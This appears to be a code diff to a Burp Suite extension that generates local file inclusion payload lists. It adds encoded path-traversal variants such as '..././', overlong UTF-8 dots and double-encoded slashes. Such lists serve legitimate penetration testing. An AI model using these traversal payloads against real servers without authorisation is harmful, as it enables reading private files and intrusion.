@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.21"
+VERSION = "0.22"
 _colorful = True
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
@@ -602,6 +602,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             if self._cbDictEncoding.isSelected():
                 listLFI.append(_resultTxt.replace("../", "..././") + filePath + "\n")
                 listLFI.append(_resultTxt.replace("../", "...//") + filePath + "\n")
+                listLFI.append(_resultTxt.replace("../", "\\../") + filePath + "\n")
+                listLFI.append(_resultTxt.replace("../", ".../") + filePath + "\n")
+                listLFI.append(_resultTxt.replace("../", "..../") + filePath + "\n")
+                listLFI.append(_resultTxt.replace("../", "...\\.\\") + filePath + "\n")
+                listLFI.append(_resultTxt.replace("../", "...\\\\") + filePath + "\n")
                 listLFI.append(_resultTxt + filePath + "%00index.html\n")
                 listLFI.append(_resultTxt + filePath + "%20index.html\n")
                 listLFI.append(_resultTxt + filePath + "%09index.html\n")
@@ -624,9 +629,10 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
                 # backslash combinations
                 # replace with /
-                delimetersSlash = ["%2f", "%252f", "%255c", "%c0%af", "%25c0%25af", "%c1%9c", "%25c1%259c", "%%32%66", "%%35%63", "/", "/", "/", "%u2215", "%u2216", "%uEFC8", "%uF025", "0x2f", "%c0%2f", "//", "///", "\\/", "\\/", "%uEFC8", "%uF025", "/\\", "/\\", "//", "%%32%66", "/"]
+                delimetersSlash = ["%2f", "%252f", "%255c", "%c0%af", "%25c0%25af", "%c1%9c", "%25c1%259c", "%%32%66", "%%35%63", "%u2215", "%u2216", "%uEFC8", "%uF025", "0x2f", "%c0%2f", "//", "///", "\\/", "\\/" , "/\\", "/\\" , "//"]
                 # replace with ..
-                delimetersDots = ["%2e%2e", "%252e%252e", "%252e%252e", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%%32%65%%32%65", "%%32%65%%32%65", "\\..", "...", "....", "%uff0e%uff0e", "..", "..", "..", "0x2e0x2e", "%c0%2e%c0%2e", "..", "..", "..", "....", "..", "..", "..", "....", "....", "..", "%%32%65%%32%65"]
+                delimetersDots = ["%2e%2e", "%252e%252e", "%252e%252e", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%%32%65%%32%65", "%%32%65%%32%65", "%uff0e%uff0e", "%uff0e%uff0e", "..", "..", "0x2e0x2e", "%c0%2e%c0%2e", "..", ".." , ".." , "....", ".." , "....", "...."]
+
                 for i in range(len(delimetersSlash)):
                     listLFI.append((_resultTxt).replace("/", delimetersSlash[i]) + filePath + "\n")
                     listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]) + "/" + filePath + "\n")
@@ -638,10 +644,10 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 # backslash
 
                 # forward slash combinations
-                # # replace with \
-                delimetersSlash = ["%5c", "%255c", "\\", "\\", "\\", "\\\\", "%u2216", "0x5c", "%c0%5c", "\\\\", "\\\\\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "%c1%9c", "\\"]
+                # replace with \
+                delimetersSlash = ["%5c", "%255c", "\\", "\\", "\\", "\\\\", "%u2216", "0x5c", "%c0%5c", "\\\\", "\\\\\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "%c1%9c"]
                 # replace with ..
-                delimetersDots = ["%2e%2e", "%252e%252e", "..", "...", "....", "....", "%uff0e%uff0e", "0x2e0x2e", "%c0%2e%c0%2e", "..", "..", "0x2e0x2e", "%uff0e%uff0e", "%c0%ae%c0%ae", "%c0%2e%c0%2e", "%2e%2e", "%25c0%25ae%25c0%25ae", "%252e%252e", "..", "%c0%ae%c0%ae"] 
+                delimetersDots = ["%2e%2e", "%252e%252e", "..", "...", "....", "....", "%uff0e%uff0e", "0x2e0x2e", "%c0%2e%c0%2e", "..", "..", "0x2e0x2e", "%uff0e%uff0e", "%c0%ae%c0%ae", "%c0%2e%c0%2e", "%2e%2e", "%25c0%25ae%25c0%25ae", "%252e%252e", "%c0%ae%c0%ae"] 
                 for i in range(len(delimetersSlash)):
                     listLFI.append((_resultTxt).replace("/", delimetersSlash[i]) + filePath + "\n")
                     listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]) + "/" + filePath + "\n")
